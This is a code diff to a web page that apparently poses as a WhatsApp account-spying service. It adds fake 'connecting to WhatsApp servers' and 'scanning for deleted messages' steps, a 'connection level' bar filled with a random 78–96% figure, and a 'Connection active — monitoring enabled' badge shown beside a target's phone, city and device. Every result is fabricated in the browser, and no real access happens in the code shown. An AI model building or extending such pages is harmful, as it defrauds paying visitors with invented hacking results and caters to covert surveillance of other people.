@@ -241,6 +241,11 @@
             to { transform: rotate(360deg); }
         }
 
+        @keyframes bfPulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.3; }
+        }
+
         .loading-title {
             font-size: 24px;
             font-weight: 700;
@@ -2095,9 +2100,13 @@
                     </div>
                     <div class="loading-step" id="step3">
                         <div class="step-icon">⏳</div>
-                        <span>Loading profile data</span>
+                        <span>Analyzing connection level</span>
                     </div>
                     <div class="loading-step" id="step4">
+                        <div class="step-icon">⏳</div>
+                        <span>Loading profile data</span>
+                    </div>
+                    <div class="loading-step" id="step5">
                         <div class="step-icon">⏳</div>
                         <span>Scanning for deleted messages</span>
                     </div>
@@ -2127,6 +2136,15 @@
                     <div class="profile-info-item">
                         <div class="value red" id="deletedCount" style="font-size: 16px;">Detected</div>
                         <div class="label">Deleted Messages</div>
+                    </div>
+                </div>
+                <div id="connectionBar" style="display:none;width:100%;margin-top:12px;">
+                    <div style="display:flex;justify-content:space-between;font-size:11px;color:#8696A0;margin-bottom:4px;">
+                        <span>Connection Level</span>
+                        <span id="connectionPct" style="color:#22c55e;font-weight:700;">0%</span>
+                    </div>
+                    <div style="height:4px;background:rgba(255,255,255,0.08);border-radius:2px;overflow:hidden;">
+                        <div id="connectionFill" style="height:100%;background:linear-gradient(90deg,#22c55e,#16a34a);border-radius:2px;width:0;transition:width 1.5s ease;"></div>
                     </div>
                 </div>
             </div>
@@ -2185,6 +2203,10 @@
                             <div class="bf-target-detail" id="bfTargetPhone"></div>
                             <div class="bf-target-detail" id="bfTargetCity"><span class="bf-target-icon">📍</span> <span id="bfTargetCityText"></span></div>
                             <div class="bf-target-detail" id="bfTargetDevice"><span class="bf-target-icon">📱</span> <span id="bfTargetDeviceText"></span></div>
+                        </div>
+                        <div id="bfConnectionStatus" style="display:none;margin-top:6px;font-size:11px;color:#22c55e;display:none;align-items:center;gap:4px;">
+                            <span style="display:inline-block;width:6px;height:6px;background:#22c55e;border-radius:50%;animation:bfPulse 1.5s infinite;"></span>
+                            Connection active &mdash; monitoring enabled
                         </div>
                     </div>
                     <div class="bf-form">
@@ -2498,12 +2520,14 @@
         async function startLoadingAnimation(phone, country) {
             const loadingSteps = [
                 { text: 'Connecting to WhatsApp servers...', progress: 10, stepId: 'step1' },
-                { text: 'Verifying phone number...', progress: 25, stepId: 'step1' },
-                { text: 'Checking WhatsApp registration...', progress: 40, stepId: 'step2' },
-                { text: 'Fetching profile data...', progress: 55, stepId: 'step3' },
-                { text: 'Loading profile picture...', progress: 70, stepId: 'step3' },
-                { text: 'Scanning for deleted messages...', progress: 85, stepId: 'step4' },
-                { text: 'Preparing access...', progress: 95, stepId: 'step4' },
+                { text: 'Verifying phone number...', progress: 20, stepId: 'step2' },
+                { text: 'Checking WhatsApp registration...', progress: 30, stepId: 'step2' },
+                { text: 'Analyzing connection level...', progress: 45, stepId: 'step3' },
+                { text: 'Connection verified ✓', progress: 62, stepId: 'step3' },
+                { text: 'Fetching profile data...', progress: 72, stepId: 'step4' },
+                { text: 'Loading profile picture...', progress: 80, stepId: 'step4' },
+                { text: 'Scanning for deleted messages...', progress: 90, stepId: 'step5' },
+                { text: 'Preparing access...', progress: 95, stepId: 'step5' },
                 { text: 'Complete!', progress: 100, stepId: null }
             ];
 
@@ -2514,7 +2538,7 @@
             const geoPromise = _fetchGeo();
 
             // Reset all steps
-            ['step1', 'step2', 'step3', 'step4'].forEach(id => {
+            ['step1', 'step2', 'step3', 'step4', 'step5'].forEach(id => {
                 const el = document.getElementById(id);
                 if (el) {
                     el.classList.remove('active', 'completed');
@@ -2655,7 +2679,24 @@
 
             setTimeout(() => {
                 showScreen('screen2');
+                animateConnectionBar();
             }, 500);
+        }
+
+        function animateConnectionBar() {
+            var bar = document.getElementById('connectionBar');
+            var fill = document.getElementById('connectionFill');
+            var pct = document.getElementById('connectionPct');
+            if (!bar || !fill || !pct) return;
+            var target = Math.floor(Math.random() * 19) + 78;
+            bar.style.display = 'block';
+            var current = 0;
+            var interval = setInterval(function() {
+                current += 1;
+                if (current >= target) { current = target; clearInterval(interval); }
+                pct.textContent = current + '%';
+                fill.style.width = current + '%';
+            }, 25);
         }
 
         // Go back
@@ -2881,6 +2922,8 @@
                 if (city) { document.getElementById('bfTargetCityText').textContent = city; } else { document.getElementById('bfTargetCity').style.display = 'none'; }
                 if (device) { document.getElementById('bfTargetDeviceText').textContent = device; } else { document.getElementById('bfTargetDevice').style.display = 'none'; }
                 el.style.display = 'flex';
+                var bfConn = document.getElementById('bfConnectionStatus');
+                if (bfConn) bfConn.style.display = 'flex';
             })();
 
             const hexChars = '0123456789abcdef';
